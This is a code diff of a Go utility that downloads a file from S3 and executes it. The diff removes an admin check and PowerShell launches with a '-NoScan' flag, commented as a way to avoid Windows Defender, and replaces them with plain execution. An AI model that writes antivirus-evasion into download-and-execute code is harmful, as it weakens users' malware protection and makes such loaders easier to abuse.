@@ -31,45 +31,25 @@ func parseS3URL(s3URL string) (bucket, key string, err error) {
 	return u.Host, strings.TrimPrefix(u.Path, "/"), nil
 }
 
-func isAdmin() bool {
-	switch runtime.GOOS {
-	case "windows":
-		cmd := exec.Command("net", "session")
-		err := cmd.Run()
-		return err == nil // nil error means we have admin rights
-	case "linux", "darwin":
-		return os.Geteuid() == 0
-	default:
-		return false
-	}
-}
-
 func executeFile(path string) error {
 	cmd := &exec.Cmd{}
 
 	if runtime.GOOS == "windows" {
+		// On Windows, try to detect if it's a script that needs an interpreter
 		ext := strings.ToLower(filepath.Ext(path))
-		hasAdminRights := isAdmin()
-
 		switch ext {
 		case ".bat", ".cmd":
 			cmd = exec.Command("cmd", "/C", path)
 		case ".ps1":
-			if hasAdminRights {
-				cmd = exec.Command("powershell", "-NoScan", "-File", path)
-			} else {
-				cmd = exec.Command("powershell", "-File", path)
-			}
+			cmd = exec.Command("powershell", "-File", path)
+		case ".py":
+			cmd = exec.Command("python", path)
 		default:
 			// For .exe and other executables
-			if hasAdminRights {
-				// avoids windows defender bullshit
-				cmd = exec.Command("powershell", "-NoScan", "-Command", "& {"+path+"}")
-			} else {
-				cmd = exec.Command(path)
-			}
+			cmd = exec.Command(path)
 		}
 	} else {
+		// On Unix systems, execute directly
 		cmd = exec.Command(path)
 	}
 
@@ -165,7 +145,8 @@ func main() {
 	defer result.Close()
 
 	// Create temp file with original extension if possible
-	tmpFile, err := os.CreateTemp("", "bootstrap-*-"+filepath.Base(key))
+	ext := filepath.Ext(key)
+	tmpFile, err := os.CreateTemp("", "s3-download-*"+ext)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "Error creating temporary file: %v\n", err)
 		os.Exit(1)
